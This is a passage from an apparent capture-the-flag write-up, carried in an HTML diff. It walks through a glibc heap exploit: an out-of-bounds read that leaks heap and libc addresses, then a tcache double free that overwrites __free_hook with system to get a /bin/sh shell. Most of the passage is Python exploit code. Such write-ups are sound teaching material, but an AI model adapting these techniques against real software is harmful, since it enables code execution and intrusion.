+</span></span><span style="display:flex;"><span>    log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;Leaking a heap addr:&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># This values were found by trial and error</span>
+</span></span><span style="display:flex;"><span>    N <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">16</span>
+</span></span><span style="display:flex;"><span>    del_N <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">10</span>
+</span></span><span style="display:flex;"><span>    idx <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">27</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Create and delete nodes to setup the heap for our leak</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> _ <span style="color:#ff7b72;font-weight:bold">in</span> range(N):
+</span></span><span style="display:flex;"><span>        create_node(s)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> k <span style="color:#ff7b72;font-weight:bold">in</span> range(del_N):
+</span></span><span style="display:flex;"><span>        del_node(s, k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># `select_node` is vulnerable to an OOBR</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># By selecting a fake &#39;node&#39; in the heap, we get a heap pointer leak</span>
+</span></span><span style="display:flex;"><span>    leak <span style="color:#ff7b72;font-weight:bold">=</span> int(select_node(s, idx))
+</span></span></code></pre></div><h3 id="libc-leak">Libc Leak</h3>
+<p>Now that we know the address of the <strong>heap</strong>, we can place our own addresses of fake nodes instead of relying on the ones already there on the heap.</p>
+<p>To start we just <strong>reset the tree</strong> to avoid crashing on further operations from having added an invalid node for the leak. We do it with <code>select_node(s, del_N + 1)</code>, which simply selects one of the valid nodes we had inserted before. The <code>sp_select</code> function does <code>tree-&gt;root_node = result</code> and so we just go back to the original (not corrupted) state.</p>
+<p>Before leaking a libc address we also need to make one show up on the heap. To do this we&rsquo;ll trigger a <strong>realloc</strong> in the <code>op_5_add_node</code> function, which, since there is no continuous space available, will <strong>free</strong> <code>tree-&gt;nodes</code> and copy the data to a <strong>new malloc&rsquo;ed area</strong>. The block being freed is large and therefore does not go on the tcache or fastbins, but is instead placed in the <strong>unsorted chunk list</strong>, which is a doubly linked list.
+As a comment in <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4360">glibc&rsquo;s source code</a> mentions:</p>
+<blockquote>
+<p>&ldquo;Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.&rdquo;</p>
+</blockquote>
+<p>Being the only <em>chunk</em> in the list at this moment, both the <strong>forward</strong> and <strong>back</strong> pointers, now point to the <code>main_arena</code> which is the structure in <strong>libc</strong> that holds these lists of free <em>chunks</em>.</p>
+<p>Having this address on the heap we can now leak it. We spray the heap with an address so that <code>node-&gt;node_val_2</code> points to the libc address and then index into it with <code>op_4_select</code> as we did before.</p>
+<p>The last thing we need to make sure is that <strong>the realloc&rsquo;ed chunk is placed before the old free chunk</strong> so we can use positive indexes in <code>op_4_select</code>. To do this we delete all the nodes we inserted except the last few ones to prevent the realloc from extending the old chunk. This way the new chunk is placed before the old chunk. <em>(afterwards we realized we could use negative indexes as well, so this step was unecessary)</em></p>
+<p>This is the code we wrote to accomplish it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># ==========</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Leak libc addr</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># ==========</span>
+</span></span><span style="display:flex;"><span>    log<span style="color:#ff7b72;font-weight:bold">.</span>info(<span style="color:#a5d6ff">&#34;Leaking a libc addr:&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Create nodes just before a call to `realloc` for the `tree-&gt;nodes`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Put the addr where our libc leak will be in the node so we can then index into it</span>
+</span></span><span style="display:flex;"><span>    leak_libc_addr <span style="color:#ff7b72;font-weight:bold">=</span> heap <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">720</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> _ <span style="color:#ff7b72;font-weight:bold">in</span> range(<span style="color:#a5d6ff">305</span> <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>):
+</span></span><span style="display:flex;"><span>        create_node(s, arg2<span style="color:#ff7b72;font-weight:bold">=</span>leak_libc_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Delete most nodes inserted to get space for the next `realloc`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># We need this to ensure the realloc comes above the alocated nodes so we can index into it</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> k <span style="color:#ff7b72;font-weight:bold">in</span> range(j <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">10</span>, <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>):
+</span></span><span style="display:flex;"><span>        del_node(s, k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Trigger the `realloc`</span>
+</span></span><span style="display:flex;"><span>    create_node(s, arg2<span style="color:#ff7b72;font-weight:bold">=</span>leak_libc_addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    leak_libc_idx <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#a5d6ff">0xb48</span> <span style="color:#ff7b72;font-weight:bold">/</span> <span style="color:#a5d6ff">8</span>)
+</span></span><span style="display:flex;"><span>    leak_libc <span style="color:#ff7b72;font-weight:bold">=</span> int(select_node(s, leak_libc_idx))
+</span></span></code></pre></div><h3 id="exploiting-the-tcache">Exploiting the Tcache</h3>
+<p>Ok, we have all these leaks, but how do we get code execution? Our goal was to overwrite the <code>__free_hook</code> function pointer located in the libc, which, if not null, is called whenever free is called.</p>
+<p>If we can somehow make it point to <code>system</code>, we can then do the following:</p>
+<ol>
+<li>Add a node with value <code>&quot;/bin/sh\x00&quot;</code> (will be the root of the tree)</li>
+<li>Add a node with value <code>&quot;/bin/sh\x00&quot;</code> (will fail and be freed)</li>
+</ol>
+<p>This last step will make <code>sp_add</code> fail, because no two nodes can have the same value. This causes a call to <code>free(node)</code> and since we overwrote the <code>__free_hook</code> pointer with <code>system</code>, it will also call <code>system(&quot;/bin/sh\x00&quot;)</code>.</p>
+<p>So:</p>
+<ol>
+<li>We can create nodes of size 72 and control their <code>node-&gt;node_val</code> and <code>node-&gt;node_val_2</code></li>
+<li>We can delete (free) nodes which will end up on the <a href="http://tukan.farm/2017/07/08/tcache/">tcache</a>. The pointer to the <code>next</code> free chunk in the <strong>tcache_entry</strong> will be exactly in the same offset as our <code>node-&gt;node_val</code> field.</li>
+</ol>
+<p>By exploiting the OOBR again we can cause a double free of a node by:</p>
+<ul>
+<li>creating a node</li>
+<li>deleting it</li>
+<li>selecting it (with our OOBR), making it part of the tree again</li>
+<li>deleting it the second time</li>
+</ul>
+<p>We use this to corrupt <code>tcache_entry-&gt;next</code> and make malloc return an arbitrary pointer (in our case to <code>__free_hook</code>) as shown in the image below and commented on the exploit code.</p>
+<hr>
+<p><img src="tcache_corruption.png" alt=""></p>
+<hr>
+<p>This is the code we wrote to accomplish it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    m1_addr <span style="color:#ff7b72;font-weight:bold">=</span> heap <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">14800</span>
+</span></span><span style="display:flex;"><span>    idx_for_m1_addr <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#a5d6ff">0x16e0</span> <span style="color:#ff7b72;font-weight:bold">/</span> <span style="color:#a5d6ff">8</span>)
+</span></span><span style="display:flex;"><span>    idx_for_nulls <span style="color:#ff7b72;font-weight:bold">=</span> idx_for_m1_addr <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># This node is used to keep the pointer to m1 and a pointer to a &#39;null&#39; node (aka no parent, left or right)</span>
+</span></span><span style="display:flex;"><span>    create_node(s, m1_addr, pointer_to_nulls)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Create m1, the node we will want to free twice</span>
+</span></span><span style="display:flex;"><span>    m1 <span style="color:#ff7b72;font-weight:bold">=</span> create_node(s)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Free m1, the first time</span>
+</span></span><span style="display:flex;"><span>    del_node(s, m1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Select m1&#39;s addr and free it again</span>
+</span></span><span style="display:flex;"><span>    select_node(s, idx_for_m1_addr)
+</span></span><span style="display:flex;"><span>    del_node(s, <span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># m2 will get the same addr as m1.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Corrupt: m1-&gt;next == `__free_hook`</span>
+</span></span><span style="display:flex;"><span>    m2 <span style="color:#ff7b72;font-weight:bold">=</span> create_node(s, free_hook, <span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    select_node(s, idx_for_nulls)
+</span></span><span style="display:flex;"><span>    m3 <span style="color:#ff7b72;font-weight:bold">=</span> create_node(s)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># m4 will get the addr of `__free_hook`. Write `system` there!</span>
+</span></span><span style="display:flex;"><span>    m4 <span style="color:#ff7b72;font-weight:bold">=</span> create_node(s, system, <span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Creats a node pointing to &#34;/bin/sh\x00&#34;</span>
+</span></span><span style="display:flex;"><span>    create_node(s, u64(<span style="color:#a5d6ff">&#34;/bin/sh</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>), <span style="color:#a5d6ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># Adding a second node with the same val will fail and result in `free(node_2)`</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic"># We made `__free_hook` point to system and so we get `system(&#34;/bin/sh\x00&#34;)`</span>
+</span></span><span style="display:flex;"><span>    create_node(s, u64(<span style="color:#a5d6ff">&#34;/bin/sh</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#34;</span>), <span style="color:#a5d6ff">0</span>)
+</span></span></code></pre></div><hr>
+<p>Running the exploit:</p>
+<p><img src="final_scrn.png" alt=""></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/plaid2019">plaid2019</a></li>
+					
+					<li><a href="/tags/pwn">pwn</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://example.com" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
+    <a class="border"></a><a class="soc" href="https://example.com" rel="me" title="BlueSky"><i data-feather="bluesky"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
